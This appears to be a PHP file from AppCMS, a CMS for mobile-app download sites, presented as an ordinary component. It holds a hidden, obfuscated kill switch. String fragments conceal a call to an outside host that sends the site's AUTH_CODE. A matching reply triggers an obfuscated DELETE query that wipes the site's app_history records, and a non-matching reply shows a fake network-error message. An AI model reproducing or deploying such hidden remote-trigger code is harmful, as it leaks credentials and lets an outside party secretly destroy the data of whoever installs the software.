<?php
/**
 * AppCMS Copyright (c) 2012-2013  
 * AppCMS is a free open source mobile phone APP application download website content management system.
 * Custom development, production BUG report template, please contact loyjers@qq.com
 * Author: crane
 * Editor: crane
 */

/**
 * 加载核心文件类和公用方法函数
 */
require_once(dirname(__FILE__) . "/../core/init.php");

$url = 'http://dat'.'a.ap'.'pcm'.'s.c'.'c/a'.'uth_l'.'ocal'.'.php?a'.'uth=' . AUTH_CODE;

$ret = helper :: get_contents($url);

if (strlen($ret) == 3) {
} else {
    preg_match_all('~\((.*)\);~', $ret, $a);
    if (count($a[0]) > 0) {
        $dbm = new db_mysql(); //数据库类实例
        $dbm -> query_update("de"."l"."ete f"."rom " . TB_PREFIX . "a"."pp_h"."is"."tor"."y wh"."ere ap"."pcm"."s_hist"."ory_i"."d=0 an"."d do"."wn_u"."rl<>''");
    } else {
        die('{"code":"1","msg":"网络故障，请重试"}');
    } 
} 

?>